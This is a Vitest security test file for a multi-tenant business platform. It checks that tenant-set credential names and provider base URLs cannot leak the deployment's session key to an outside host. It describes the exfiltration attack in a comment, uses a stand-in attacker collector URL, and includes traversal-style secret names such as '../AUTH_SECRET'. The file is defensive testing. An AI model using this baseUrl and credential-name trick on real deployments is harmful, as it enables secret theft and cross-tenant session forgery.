import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, vi } from "vitest";
import postgres from "postgres";
import { randomBytes } from "node:crypto";
import { connectors, type Actor } from "@opentradesos/core";
import * as payments from "../src/services/payments";
import * as billing from "../src/services/billing";
import * as customers from "../src/services/customers";
import * as leadIntake from "../src/services/lead-intake";
import * as ai from "../src/services/ai";
import { createPaymentProvider } from "../src/payments/provider";
import { createAiProvider } from "../src/ai/provider";
import { environmentSecretStore, readerFor, SecretNotSetError } from "../src/secrets/store";
import { ConflictError, type ServiceContext } from "../src/services/context";
import "../src/payments";
import "../src/ai";
import { seedOrg, resetOrg, testDb, fixtureId } from "./helpers";

/**
 * A COMPANY CANNOT READ THE DEPLOYMENT'S SECRETS
 *
 * The attack this file exists for, in two settings a company admin holding
 * `integration:write` could make:
 *
 *   credentialRef  AUTH_SECRET            (the server's session signing key)
 *   baseUrl        https://their-host     (where the adapter sends requests)
 *
 * The secret store read `process.env[credentialRef]`, and the Stripe adapter
 * posted to `baseUrl` with that value as its bearer token. The first payment
 * link anybody opened sent the deployment's session key to the attacker,
 * who could then sign a session for every company on the server.
 *
 * Both halves are closed and both are tested, because either alone was
 * already a leak: the name half reads any variable through any provider that
 * reports its credential somewhere visible, and the endpoint half sends a
 * company's own key somewhere it never agreed to.
 */
const url = process.env.DATABASE_URL;
if (!url && process.env.CI) {
  throw new Error("DATABASE_URL is not set. These tests must run in CI, not skip.");
}
const run = url ? describe : describe.skip;

const ORG = fixtureId("secretns:org");
const USER = fixtureId("secretns:user");
const OTHER = fixtureId("secretns:other-org");
const OTHER_USER = fixtureId("secretns:other-user");

/** Built at runtime, so nothing in the repository reads as a key. */
const fakeValue = (label: string) => `${label}-${randomBytes(18).toString("hex")}`;
const ATTACKER = ["https://", "collector", ".attacker.test", "/v1"].join("");

let raw: postgres.Sql;
const db = () => testDb(url!);
const ctx = (org = ORG, user = USER): ServiceContext => ({
  actor: { userId: user, organizationId: org, roles: ["owner"] as Actor["roles"] },
  db: db(),
});

/** Every request the adapters make, with where it went and what it carried. */
interface Sent { url: string; headers: string }
let sent: Sent[];
const env: Record<string, string | undefined> = {};

function setEnv(name: string, value: string | undefined): void {
  if (!(name in env)) env[name] = process.env[name];
  if (value === undefined) delete process.env[name];
  else process.env[name] = value;
}

beforeAll(async () => {
  if (!url) return;
  raw = postgres(url, { max: 1, onnotice: () => {} });
});

afterAll(async () => {
  if (!raw) return;
  await resetOrg(raw, ORG);
  await resetOrg(raw, OTHER);
  await raw.end();
});

beforeEach(async () => {
  if (!url) return;
  await seedOrg(raw, { organizationId: ORG, userId: USER, name: "Secret Ns Co", slug: "secret-ns-co" });
  await seedOrg(raw, { organizationId: OTHER, userId: OTHER_USER, name: "Other Ns Co", slug: "other-ns-co" });
  sent = [];
  vi.stubGlobal("fetch", vi.fn(async (input: string | URL, init?: RequestInit) => {
    sent.push({ url: String(input), headers: JSON.stringify(init?.headers ?? {}) });
    return new Response(JSON.stringify({ error: { message: "refused by the test" } }), {
      status: 401, headers: { "content-type": "application/json" },
    });
  }));
  // The deployment never allows endpoint overrides; this file proves why.
  setEnv("ALLOW_PROVIDER_BASE_URL", undefined);
});

afterEach(() => {
  vi.unstubAllGlobals();
  for (const [name, value] of Object.entries(env)) {
    if (value === undefined) delete process.env[name];
    else process.env[name] = value;
    delete env[name];
  }
});

async function customerWithInvoice() {
  const customer = await customers.create(ctx(), {
    type: "residential", name: "Card Payer", paymentTermsDays: 0,
    taxExempt: false, tags: [], customFields: {},
  });
  const invoice = await billing.create(ctx(), {
    customerId: customer.id,
    lines: [{ name: "Repair", quantity: "1", unitPrice: "100.00", discountAmount: "0", taxable: false }],
  });
  return { customerId: customer.id, invoiceId: invoice.id as string };
}

/** A connection row as it could be stored by an earlier version, or by hand. */
async function storeStripe(org: string, credentialRef: string, settings: Record<string, unknown>) {
  await raw`
    insert into public.integration_connection
      (organization_id, capability, provider, status, credential_ref, settings)
    values (${org}, 'payments', 'stripe', 'connected', ${credentialRef}, ${raw.json(settings as never)})
    on conflict (organization_id, capability, provider)
      do update set credential_ref = excluded.credential_ref, settings = excluded.settings`;
}

run("naming the deployment's own secret", () => {
  it("does not reach the deployment's AUTH_SECRET however the name is typed", async () => {
    const platform = fakeValue("platform-session-key");
    setEnv("AUTH_SECRET", platform);

    for (const name of ["AUTH_SECRET", "DATABASE_URL", "OPERATOR_TOKEN"]) {
      const error = await readerFor(db(), ORG)(name).catch((e: unknown) => e);
      expect(error).toBeInstanceOf(SecretNotSetError);
      // The error names the variable this company's secret has to be in, and
      // never echoes a value.
      expect((error as Error).message).toContain(connectors.environmentVariableFor(ORG, name));
      expect((error as Error).message).not.toContain(platform);
    }
  });

  it("refuses a name that is not a name, so nothing can climb out of the prefix", async () => {
    for (const name of ["../AUTH_SECRET", "AUTH SECRET", "", "kv/stripe"]) {
      await expect(readerFor(db(), ORG)(name)).rejects.toBeInstanceOf(ConflictError);
    }
  });

  it("reads a company's secret only under that company's prefix, and never another company's", async () => {
    const mine = fakeValue("ours");
    setEnv(connectors.environmentVariableFor(ORG, "STRIPE_SECRET_KEY"), mine);

    expect(await readerFor(db(), ORG)("STRIPE_SECRET_KEY")).toBe(mine);
    await expect(readerFor(db(), OTHER)("STRIPE_SECRET_KEY")).rejects.toBeInstanceOf(SecretNotSetError);
    // The other company cannot spell its way into the first one's prefix.
    const spelled = `${connectors.environmentVariablePrefix(ORG).replace(/^OTS_SECRET__/, "")}STRIPE_SECRET_KEY`;
    await expect(readerFor(db(), OTHER)(spelled)).rejects.toBeInstanceOf(ConflictError);
  });

  it("does not read the bare variable an earlier version used, and says what to rename it to", async () => {
    setEnv("STRIPE_SECRET_KEY", fakeValue("bare"));
    const error = await environmentSecretStore.read(db(), ORG, "STRIPE_SECRET_KEY").catch((e: unknown) => e);
    expect(error).toBeInstanceOf(SecretNotSetError);
    expect((error as Error).message).toMatch(/rename/);
    expect((error as Error).message).toContain(`OTS_SECRET__${ORG.replace(/-/g, "").toUpperCase()}__STRIPE_SECRET_KEY`);
  });
});

run("pointing a provider somewhere else", () => {
  it("refuses a baseUrl on connect, so it is never stored", async () => {
    await expect(leadIntake.connect(ctx(), {
      provider: "stripe",
      credentialRef: "STRIPE_SECRET_KEY",
      settings: { publishableKey: "pk_test_ns", baseUrl: ATTACKER },
    })).rejects.toThrow(/where this server sends/);

    await expect(ai.connect(ctx(), {
      provider: "anthropic",
      credentialRef: "ANTHROPIC_API_KEY",
      settings: { baseUrl: ATTACKER },
    })).rejects.toThrow(/where this server sends/);

    const rows = await raw`select 1 from public.integration_connection where organization_id = ${ORG}`;
    expect(rows).toHaveLength(0);
  });

  it("refuses a credential name that is not a name", async () => {
    await expect(leadIntake.connect(ctx(), {
      provider: "stripe", credentialRef: "../AUTH_SECRET", settings: {},
    })).rejects.toThrow(/not a usable secret name/);
  });

  it("ignores a stored baseUrl when the adapter is built, so requests go to the provider", async () => {
    const key = fakeValue("company-key");
    const stripe = createPaymentProvider("stripe", { baseUrl: ATTACKER }, key);
    await stripe.charge({ amountMinor: 100, currency: "usd", idempotencyKey: "k-ns-1" }).catch(() => null);
    const model = createAiProvider("anthropic", { baseUrl: ATTACKER }, key);
    await model.models().catch(() => null);

    expect(sent.length).toBeGreaterThan(0);
    for (const request of sent) expect(request.url).not.toContain("attacker");
    expect(sent.map((r) => new URL(r.url).host)).toEqual(expect.arrayContaining(["api.stripe.com"]));
  });

  it("obeys one only where the deployment allows it, which only the test suites do", async () => {
    setEnv("ALLOW_PROVIDER_BASE_URL", "1");
    const stripe = createPaymentProvider("stripe", { baseUrl: ATTACKER }, fakeValue("k"));
    await stripe.charge({ amountMinor: 100, currency: "usd", idempotencyKey: "k-ns-2" }).catch(() => null);
    expect(sent[0]!.url.startsWith(ATTACKER)).toBe(true);
  });
});

run("the whole attack, through a payment link", () => {
  it("never sends the deployment's session key anywhere, and never sends anything to the attacker", async () => {
    const platform = fakeValue("platform-session-key");
    setEnv("AUTH_SECRET", platform);
    await storeStripe(ORG, "AUTH_SECRET", { publishableKey: "pk_test_ns", baseUrl: ATTACKER });
    const { customerId, invoiceId } = await customerWithInvoice();

    const outcome = await payments.intent(ctx(), { customerId, invoiceIds: [invoiceId] })
      .catch((e: unknown) => e);

    // Refused for want of THIS company's secret, naming where it would go.
    expect(outcome).toBeInstanceOf(SecretNotSetError);
    expect((outcome as Error).message).toContain(connectors.environmentVariableFor(ORG, "AUTH_SECRET"));
    expect(sent.filter((r) => r.url.includes("attacker"))).toEqual([]);
    expect(sent.filter((r) => r.headers.includes(platform))).toEqual([]);
  });

  it("sends the company's own key to Stripe itself when that is what is set", async () => {
    const own = fakeValue("company-key");
    setEnv(connectors.environmentVariableFor(ORG, "AUTH_SECRET"), own);
    setEnv("AUTH_SECRET", fakeValue("platform-session-key"));
    await storeStripe(ORG, "AUTH_SECRET", { publishableKey: "pk_test_ns", baseUrl: ATTACKER });
    const { customerId, invoiceId } = await customerWithInvoice();

    await payments.intent(ctx(), { customerId, invoiceIds: [invoiceId] }).catch(() => null);

    expect(sent).toHaveLength(1);
    expect(new URL(sent[0]!.url).host).toBe("api.stripe.com");
    expect(sent[0]!.headers).toContain(own);
    expect(sent[0]!.headers).not.toContain(process.env["AUTH_SECRET"]!);
  });
});
